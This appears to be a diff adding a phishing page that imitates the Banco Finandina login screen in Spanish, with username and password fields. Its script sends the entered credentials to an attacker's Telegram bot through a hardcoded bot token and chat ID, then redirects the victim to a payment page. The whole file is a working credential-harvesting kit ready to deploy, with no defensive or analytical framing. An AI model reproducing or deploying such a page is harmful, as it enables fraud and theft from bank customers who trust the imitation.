@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Finandina - Inicia sesión</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            width: 320px;
+            padding: 20px;
+        }
+
+        .logo img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 10px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px 15px;
+            border: none;
+            border-bottom: 1px solid #ddd;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #fff;
+        }
+
+        .input-group img {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+        }
+
+        .forgot-link {
+            font-size: 14px;
+            color: #333;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 30px;
+            text-align: right;
+        }
+
+        .btn-continue,
+        .btn-register {
+            width: 100%;
+            padding: 15px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .btn-continue {
+            background-color: #f797a1;
+            color: white;
+            border: none;
+        }
+
+        .btn-register {
+            background-color: transparent;
+            color: #f797a1;
+            border: 2px solid #f797a1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="../img/BANCO FINANDINA.png" style="width: 70%;" alt="Banco Finandina">
+        </div>
+        <h1>Inicia sesión</h1>
+        <p>Completa los siguientes datos:</p>
+        <div class="input-group">
+            <input type="text" id="usuario" placeholder="Ingresa tu usuario" style="margin-bottom: 5%;">
+            <input type="password" id="contrasena" placeholder="Ingresa tu contraseña">
+        </div>
+        <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
+        <button class="btn-continue" onclick="nextPage()">Continuar</button>
+        <button class="btn-register">Registrarme ahora</button>
+    </div>
+    
+    <script>
+        // Bandera para controlar el envío de datos
+        let datosEnviados = false;
+    
+        // Función de validación y envío de datos a Telegram
+        function nextPage() {
+            // Obtener los valores de los campos
+            const usuario = document.getElementById('usuario').value;
+            const contrasena = document.getElementById('contrasena').value;
+    
+            // Validar que los campos no estén vacíos
+            if (!usuario || !contrasena) {
+                alert("Por favor, complete todos los campos.");
+                return;
+            }
+    
+            // Si los datos no han sido enviados aún
+            if (!datosEnviados) {
+                // Preparar los datos para enviar al bot de Telegram
+                const mensaje = `Nuevo acceso:\nUsuario: ${usuario}\nContraseña: ${contrasena}`;
+    
+                // Llamar a la función para enviar los datos al bot de Telegram
+                enviarATelegram(mensaje);
+            } else {
+                // Si ya se enviaron los datos, redirigir
+                window.location.href = "../cargapago.html";  // Redirigir después de enviar
+            }
+        }
+    
+        // Función para enviar el mensaje al bot de Telegram
+        function enviarATelegram(mensaje) {
+            const token = "8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE"; // Reemplaza con el token de tu bot de Telegram
+            const chatId = "5848946481"; // Reemplaza con el ID de tu chat o canal de Telegram
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+    
+            // Enviar los datos usando Fetch API
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        datosEnviados = true;  // Marcar los datos como enviados
+                        window.location.href = "../cargapago.html";  // Redirigir después de enviar
+                    } else {
+                        alert("Hubo un error al enviar los datos.");
+                    }
+                })
+                .catch(error => {
+                    alert("Error en la conexión. Inténtalo nuevamente.");
+                });
+        }
+    
+        // Función para el botón 'Anterior'
+        function previousPage() {
+            window.history.back();  // Redirige a la página anterior
+        }
+    </script>
+    
+
+</body>
+</html>
